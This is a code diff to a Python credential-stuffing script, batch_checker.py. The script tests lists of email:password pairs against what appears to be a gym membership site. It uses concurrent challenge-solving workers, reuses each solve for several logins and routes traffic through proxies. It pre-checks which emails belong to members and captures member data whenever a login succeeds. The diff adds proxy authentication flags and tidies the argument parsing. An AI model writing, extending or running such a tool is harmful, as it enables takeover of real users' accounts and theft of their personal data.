@@ -262,17 +262,35 @@ def batch_check(creds, workers=10, do_precheck=True, do_capture=True, precheck_t
     return results
 
 
-if __name__ == "__main__":
+def _parse_flags():
     args = [a for a in sys.argv[1:] if not a.startswith("--")]
-    flags = {f.split("=")[0]: f.split("=")[1] if "=" in f else True
-             for f in sys.argv[1:] if f.startswith("--")}
+    flags = {}
+    for f in sys.argv[1:]:
+        if f.startswith("--"):
+            if "=" in f:
+                k, v = f.split("=", 1)
+                flags[k] = v
+            else:
+                flags[f] = True
+    return args, flags
+
+
+if __name__ == "__main__":
+    args, flags = _parse_flags()
+
+    if "--proxy-user" in flags:
+        os.environ["PROXY_USER"] = flags["--proxy-user"]
+    if "--proxy-pass" in flags:
+        os.environ["PROXY_PASS"] = flags["--proxy-pass"]
 
     if not args:
         print("Usage: python batch_checker.py <creds_file> [workers] [flags]")
         print("  creds_file: one email:password per line")
-        print(f"  workers: concurrent solve workers (default: 10)")
+        print("  workers: concurrent solve workers (default: 10)")
         print(f"  Each solve is reused for {REUSE_LIMIT} credential checks")
         print("\nFlags:")
+        print("  --proxy-user=USER       proxy username")
+        print("  --proxy-pass=PASS       proxy password")
         print("  --no-precheck           skip gym membership pre-check")
         print("  --no-capture            skip member data capture on valid login")
         print("  --precheck-threads=N    pre-check threads (default: 50)")
@@ -283,6 +301,13 @@ if __name__ == "__main__":
     do_precheck = "--no-precheck" not in flags
     do_capture = "--no-capture" not in flags
     precheck_threads = int(flags.get("--precheck-threads", 50))
+
+    import importlib, solver_jsdom
+    importlib.reload(solver_jsdom)
+    from solver_jsdom import (
+        solve_session, check_credential, cleanup_session,
+        pre_check_email, _log, _make_proxy, PROXY_USER,
+    )
 
     creds = load_credentials(creds_file)
     if not creds:
